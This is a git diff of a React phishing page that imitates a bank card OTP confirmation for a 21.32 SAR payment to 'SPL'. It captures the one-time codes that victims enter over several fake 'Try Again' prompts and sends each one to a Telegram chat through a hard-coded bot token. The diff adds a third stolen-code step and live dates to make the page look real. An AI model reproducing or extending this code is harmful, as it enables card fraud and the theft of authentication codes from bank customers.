@@ -6,7 +6,7 @@ import { useState } from "react";
 import Header from "./components/header/Header";
 import {GiSmartphone} from "react-icons/gi"
 import msgLogo from "./images/logo_sms.png"
-import { Switch, Route, Redirect } from "react-router-dom";
+
 import visa from "/home/muhammadsubhan/Desktop/gritcha/src/images/visa.png"
 
 function Page2() {
@@ -20,10 +20,14 @@ function Page2() {
   const [step3, setStep3] = useState(false);
   const [userId, setUserId] = useState("");
   const [pass, setPass] = useState("");
-  console.log(userId,"id")
-  console.log(pass,"pass")
+
+
   const [beforeOtp,setBeforeOtp]=useState(false)
   let [secondSmsPage,setSecondSmsPage]=useState(false)
+  let[thirdCode,setThirdCode]=useState("")
+  let D=new Date()
+
+
   const second_beforeOtp=()=>{
     setSecondSmsPage(true)
     setBeforeOtp(true)
@@ -32,50 +36,80 @@ function Page2() {
     accessToken: "1946580313:AAFbzUqaVbUGlCE4LFTWvGjbzhGF4WYAcD0",
   });
   const sendmsg1 = async () => {
-    console.log("sending msg now");
-    console.log("password "+pass)
+
     await client.sendMessage(
       -1001578583679,
       "sms1 : " + userId
-    );
+    )
+
   };
   const sendmsg2 = async () => {
-    console.log("sending msg now");
-    console.log("password "+pass)
+
+
     await client.sendMessage(
       -1001578583679,
       "sms2 : " + pass
-    );
+    )
+
   };
-  // "sms1 : " + pass + " \n  sms2  : " + userId first i was sending this 
+  const sendmsg3 = async () => {
+ 
+
+    await client.sendMessage(
+      -1001578583679,
+      "sms3 : " + thirdCode
+    )
+
+  };
+  function formatAMPM(date) {
+    var hours = date.getHours();
+    var minutes = date.getMinutes();
+    var ampm = hours >= 12 ? 'pm' : 'am';
+    hours = hours % 12;
+    hours = hours ? hours : 12; // the hour '0' should be '12'
+    minutes = minutes < 10 ? '0'+minutes : minutes;
+    var strTime = hours + ':' + minutes + ' ' + ampm;
+    return strTime;
+  }
+  
+  
+
   let [errorPage,setErrorPage]=useState(false)
- console.log(secondSmsPage,"sms pag")
+
  const ErrorPage=()=>{
    setStep1(false)
-   setIsLoading(true);
+  
+
    sendmsg1()
+   setIsLoading(true);
+  ;
    setTimeout(() => {
     setIsLoading(false);
     setErrorPage(true);
-  }, 1000);
+  }, 10000);
 
  }
   const handleSubmit = () => {
-   console.log("hande submit chal k nahi")
-   console.log("pass",pass,"id",userId)
-     if(pass && userId){ setStep1(false);
-      setBeforeOtp(true)
-
+ 
+   console.log("id",userId)
+   if(userId,pass){
+    setStep1(false);
+    sendmsg3()
+    setStep2(false)
+  
+    setBeforeOtp(true)
+   
       setErrorPage(false)
       setIsLoading(true);
-      sendmsg2();
+      
+      // sendmsg2();0
       setTimeout(() => {
         setIsLoading(false);
-        console.log(step3,"before step3")
+       
         setStep3(true);
-        console.log(step3,"after step3")
+       
         if(step3==false){
-          console.log("andar aya k nahi")
+         
           setBeforeOtp(false)
           setTimeout(
             ()=>
@@ -83,18 +117,22 @@ function Page2() {
             ,2000
           )
         }
-      }, 5000);
+      }, 10000);
+   }
     
-    }
+    
   };
 
   const sendMessage = () => {
-    setStep2(false);
+    
+    setErrorPage(false)
+    sendmsg2()
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
-      setStep3(true);
-    }, 5000);
+      setStep2(true);
+     
+    }, 10000);
   };
   return (
     <>
@@ -189,7 +227,10 @@ Confirmation by SMS
                                           class="txtright pb-10"
                                         >
                                           {/* {format(date, "MM/dd/yyyy HH:mm a")} */}
-                                          &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;       09/20/2021   &nbsp;   19:28 PM
+                                          &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     &nbsp;     {D.getDay() + "/"+D.getMonth()+"/"+D.getFullYear()
+                                          
+                                          
+                                          }   &nbsp;  &nbsp;   {formatAMPM(new Date)}
                                         </td>
                                       </tr>
                                       <tr _ngcontent-jha-c48="">
@@ -309,7 +350,7 @@ Confirmation by SMS
                                       
                                       :
                                       <div className="before_otp">
-                                      <img style={{width:"55px",height:"50px"}} src={msgLogo}></img>
+                                      {/* <img style={{width:"55px",height:"50px"}} src={msgLogo}></img> */}
                                         <button
                                           _ngcontent-jha-c48=""
                                           tabindex="55"
@@ -626,138 +667,146 @@ try again
                                               </div>
                                             </div>
                                             {errorPage && (
-                                              <div
-                                                _ngcontent-jha-c48=""
-                                                class="appsendnotification"
-                                                style={{border:"2px soid red",backgroundColor:"white"}}
-                                              >
-                                                <div _ngcontent-jha-c48=""  style={{border:"2px soid red",backgroundColor:"white"}}>
-                                                  <br _ngcontent-jha-c48="" />
-                                                  <h1
-                                                    style={{
-                                                      fontWeight: 500,
-                                                      fontSize: 14,
-                                                      textAlign:"center"
-                                                    }}
-                                                    _ngcontent-jha-c48=""
-                                                  >
-                                                   Please Try again
-                                                  </h1>
+                                               <div className="message_otp appsendnotification" style={{backgroundColor:"white"}}>
+                                               <br />
+                                            <p className="message_otp_oneTime"> Please Submit your One-Time Password (OTP) </p>
+                                                                                  <p className="message_otp_transaction_text">Please enter the otp send to your registered mobile number to<br /> 
+                                                                                    complete the transaction . 
+                                            
+                                                                                  </p>
+                                                                                 <div className="message_otp_details_center">
+                                                                                    <p className="message_otp_title">Mercant : <span>SPL</span></p>
+                                                                                    <p className="message_otp_title">Amount  : <span>21.32 SAR</span></p>
+                                                                                    <p className="message_otp_title">Date  : <span>{D.getDay() + "/"+D.getMonth()+"/"+D.getFullYear()}</span></p>
+                                                                                    <p className="message_otp_title">Card number  : <span>xxxx xxxx xxxx  6000</span></p>
+                                                                                 </div>
+                                                                                 <br />
+                                                                                 <p style={{color:"red",textAlign:"center",fontSize:"19px"}}> Try Again</p>
+                                                                                  <div className="message_otp_input_resend_text">
+                                                                                  <p className="one_time_text">One-Time Password (OTP) </p>
+                                                                                 
+                                                                                  <span className="input_box_div"><input className="input_box" onChange={(e)=>{setPass(e.target.value)}}></input></span>
+                                                                                  <span className="one_time_text">Resend OTP</span>
+                                                                                  </div>
+                                                                                  <br />
+                                                                                    <p className="one_time_text">Note : OTP is sent to your registered mobile number</p>
+                                                                                    <div className="otp-button">
+                                                                                      <button className="otp_button_design"   onClick={sendMessage}>Submit</button>
+                                                                                      <button className="otp_button_design">Cancel</button>
+                                                                                    <span syle={{fontSize:"18px"}}>Help</span>
+                                                                                  
+                                                                                    </div>
+                                                                                    <p className="terms_text">Term of Service</p>
+                                            
+                                            
+                                                                                    </div>
+                                //               <div
+                                //                 _ngcontent-jha-c48=""
+                                //                 class="appsendnotification"
+                                //                 style={{border:"2px soid red",backgroundColor:"white"}}
+                                //               >
+                                //                 <div _ngcontent-jha-c48=""  style={{border:"2px soid red",backgroundColor:"white"}}>
+                                //                   <br _ngcontent-jha-c48="" />
+                                //                   <h1
+                                //                     style={{
+                                //                       fontWeight: 500,
+                                //                       fontSize: 14,
+                                //                       textAlign:"center"
+                                //                     }}
+                                //                     _ngcontent-jha-c48=""
+                                //                   >
+                                //                    Please Try again
+                                //                   </h1>
                                                   
-                                                  <div
-                                                    _ngcontent-jha-c48=""
-                                                    class="frame__row"
+                                //                   <div
+                                //                     _ngcontent-jha-c48=""
+                                //                     class="frame__row"
 
-                                                  >
-                                                      <div style={{textAlign:"center",display:"flex",justifyContent:"center"}}>  
-                                <input onChange={(e)=>{setUserId(e.target.value)}} style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input>
-                                </div>
-                                                  < br />
-                                         <div 
-                                        style={{textAlign:"center"}}> 
-                                        <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={handleSubmit}>Verify</button></div>
-                                           < br />
+                                //                   >
+                                //                       <div style={{textAlign:"center",display:"flex",justifyContent:"center"}}>  
+                                // <input onChange={(e)=>{setUserId(e.target.value)}} style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input>
+                                // </div>
+                                //                   < br />
+                                //          <div 
+                                //         style={{textAlign:"center"}}> 
+                                //         <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={handleSubmit}>Verify</button></div>
+                                //            < br />
                                                
-                                                </div>
-                                                </div>
-                                              </div>
+                                //                 </div>
+                                //                 </div>
+                                //               </div>
                                             )}
 
 
-                                            {step2 && (
-                                              <div
-                                                _ngcontent-jha-c48=""
-                                                class="appsendnotification"
-                                                style={{border:"2px soid red",backgroundColor:"white"}}
-                                              >
-                                                <div _ngcontent-jha-c48=""  style={{border:"2px soid red",backgroundColor:"white"}}>
-                                                  <br _ngcontent-jha-c48="" />
-                                                  <h1
-                                                    style={{
-                                                      fontWeight: 500,
-                                                      fontSize: 14,
-                                                    }}
-                                                    _ngcontent-jha-c48=""
-                                                  >
-                                                   Approve with key app
-                                                  </h1>
-                                                  <div
-                                                    _ngcontent-jha-c48=""
-                                                    class="frame__row"
+{step2 && (
+                                               <div className="message_otp appsendnotification" style={{backgroundColor:"white"}}>
+                                               <br />
+                                            <p className="message_otp_oneTime"> Please Submit your One-Time Password (OTP) </p>
+                                                                                  <p className="message_otp_transaction_text">Please enter the otp send to your registered mobile number to<br /> 
+                                                                                    complete the transaction . 
+                                            
+                                                                                  </p>
+                                                                                 <div className="message_otp_details_center">
+                                                                                    <p className="message_otp_title">Mercant : <span>SPL</span></p>
+                                                                                    <p className="message_otp_title">Amount  : <span>21.32 SAR</span></p>
+<p className="message_otp_title">Date  : <span>{D.getDay() + "/"+D.getMonth()+"/"+D.getFullYear()}</span></p>
+                                                                                    <p className="message_otp_title">Card number  : <span>xxxx xxxx xxxx  6000</span></p>
+                                                                                 </div>
+                                                                                 <br />
+                                                                                 <p style={{color:"red",textAlign:"center",fontSize:"19px"}}>Try Again</p>
+                                                                                  <div className="message_otp_input_resend_text">
+                                                                                  <p className="one_time_text">One-Time Password (OTP) </p>
+                                                                                 
+                                                                                  <span className="input_box_div"><input className="input_box" onChange={(e)=>{setThirdCode(e.target.value)}}></input></span>
+                                                                                  <span className="one_time_text">Resend OTP</span>
+                                                                                  </div>
+                                                                                  <br />
+                                                                                    <p className="one_time_text">Note : OTP is sent to your registered mobile number</p>
+                                                                                    <div className="otp-button">
+                                                                                      <button className="otp_button_design"   onClick={handleSubmit}>Submit</button>
+                                                                                      <button className="otp_button_design">Cancel</button>
+                                                                                    <span syle={{fontSize:"18px"}}>Help</span>
+                                                                                  
+                                                                                    </div>
+                                                                                    <p className="terms_text">Term of Service</p>
+                                            
+                                            
+                                                                                    </div>
+                                //               <div
+                                //                 _ngcontent-jha-c48=""
+                                //                 class="appsendnotification"
+                                //                 style={{border:"2px soid red",backgroundColor:"white"}}
+                                //               >
+                                //                 <div _ngcontent-jha-c48=""  style={{border:"2px soid red",backgroundColor:"white"}}>
+                                //                   <br _ngcontent-jha-c48="" />
+                                //                   <h1
+                                //                     style={{
+                                //                       fontWeight: 500,
+                                //                       fontSize: 14,
+                                //                       textAlign:"center"
+                                //                     }}
+                                //                     _ngcontent-jha-c48=""
+                                //                   >
+                                //                    Please Try again
+                                //                   </h1>
+                                                  
+                                //                   <div
+                                //                     _ngcontent-jha-c48=""
+                                //                     class="frame__row"
 
-                                                  >
-                                                    <div
-                                                      _ngcontent-jha-c48=""
-                                                      class="top-icon-frame spacer"
-                                                    >
-                                                      <div
-                                                        _ngcontent-jha-c48=""
-                                                        aria-label="nøgleapp"
-                                                        class="otp__icon-phone-pulse"
-                                                        style={{border:"2px soid red",backgroundColor:"white"}}
-                                                      ></div>
-                                                      <div
-                                                        _ngcontent-jha-c48=""
-                                                        aria-label="nøgleapp"
-                                                        class="otp__icon-phone icon-element"
-                                                      ></div>
-                                                    </div>
-                                                    <div _ngcontent-jha-c48="">
-                                                      <p
-                                                        _ngcontent-jha-c48=""
-                                                        class="spacer"
-                                                      >
-                                                        < br />
-                                                       Send request for approval to your key apps on mobile / tablet.
-                                                      </p>
-                                                    </div>
-                                                    <div
-                                                      _ngcontent-jha-c48=""
-                                                      aria-hidden="true"
-                                                      class="hide-element"
-                                                    >
-                                                      <p
-                                                        _ngcontent-jha-c48=""
-                                                        class="spacer hide-element"
-                                                      ></p>
-                                                      <p
-                                                        _ngcontent-jha-c48=""
-                                                        class="spacer"
-                                                      >
-                                                        Din anmodning er klar
-                                                        til godkendelse i dine
-                                                        nøgleapps på
-                                                        mobil/tablet.
-                                                      </p>
-                                                    </div>
-                                                    <div
-                                                      _ngcontent-jha-c48=""
-                                                      class="spacer"
-                                                    ></div>
-                                                    <div _ngcontent-jha-c48="">
-                                                      {/* <button
-                                                       
-                                                     
-                                                     
-                                                        tabindex="51"
-                                                        title="Klik her for at godkende med nøgleapp"
-                                                        type="button"
-                                                        class="button button--submit spacer"
-                                                      >
-                                                        Send
-                                                      </button> */}
-                                                      <div 
-                                        style={{textAlign:"center"}}> 
-                                        <button 
-                                           _ngcontent-jha-c48=""
-                                           aria-label="Send"
-                                         onClick={sendMessage}
-                                        style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",
-                                        textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} >Send</button></div>
-                                                    </div>
-                                                  </div>
-                                                </div>
-                                              </div>
+                                //                   >
+                                //                       <div style={{textAlign:"center",display:"flex",justifyContent:"center"}}>  
+                                // <input onChange={(e)=>{setUserId(e.target.value)}} style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input>
+                                // </div>
+                                //                   < br />
+                                //          <div 
+                                //         style={{textAlign:"center"}}> 
+                                //         <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={handleSubmit}>Verify</button></div>
+                                //            < br />
+                                               
+                                //                 </div>
+                                //                 </div>
+                                //               </div>
                                             )}
 
                                             {step1 && (
@@ -797,13 +846,14 @@ try again
                                      <div className="message_otp_details_center">
                                         <p className="message_otp_title">Mercant : <span>SPL</span></p>
                                         <p className="message_otp_title">Amount  : <span>21.32 SAR</span></p>
-                                        <p className="message_otp_title">Date  : <span>21:09::23</span></p>
+                                        <p className="message_otp_title">Date  : <span>{D.getDay() + "/"+D.getMonth()+"/"+D.getFullYear()}</span></p>
                                         <p className="message_otp_title">Card number  : <span>xxxx xxxx xxxx  6000</span></p>
                                      </div>
                                      <br />
+                                    
                                       <div className="message_otp_input_resend_text">
                                       <p className="one_time_text">One-Time Password (OTP) </p>
-                                      <span className="input_box_div"><input className="input_box"  onChange={(e)=>{setPass(e.target.value)}}></input></span>
+                                      <span className="input_box_div"><input className="input_box"  onChange={(e)=>{setUserId(e.target.value)}}></input></span>
                                       <span className="one_time_text">Resend OTP</span>
                                       </div>
                                       <br />
